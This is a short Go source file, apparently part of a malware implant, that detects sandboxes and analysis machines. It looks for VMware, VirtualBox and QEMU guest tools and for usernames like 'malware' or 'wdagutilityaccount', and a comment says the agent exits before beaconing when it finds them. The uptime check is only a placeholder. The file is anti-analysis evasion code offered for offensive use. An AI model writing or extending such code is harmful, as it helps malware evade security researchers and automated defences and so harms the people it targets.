package main

import (
"os"
"time"
)

// IsSandboxed detects automated analysis environments.
// Called at startup ? if true, agent exits before any beacon.
func IsSandboxed() bool {
// 1. Uptime < 10 minutes = freshly spawned VM (sandboxes are ephemeral)
if uptime := getUptimeMinutes(); uptime > 0 && uptime < 10 {
return true
}

// 2. Known sandbox artifacts
for _, p := range []string{
`C:\Program Files\VMware\VMware Tools`,
`C:\Program Files\Oracle\VirtualBox Guest Additions`,
`C:\Program Files\qemu-ga`,
`C:\Users\sandbox`,
`C:\Users\malware`,
`C:\Users\wdagutilityaccount`,
} {
if _, err := os.Stat(p); err == nil {
return true
}
}

// 3. Windows username checks
user := os.Getenv("USERNAME")
for _, u := range []string{"sandbox", "malware", "analysis", "wdagutilityaccount"} {
if user == u {
return true
}
}

return false
}

func getUptimeMinutes() int {
// Use GetTickCount via syscall to read uptime
// Placeholder: full impl uses windows.GetTickCount64
return 0
}

var _ = time.Now
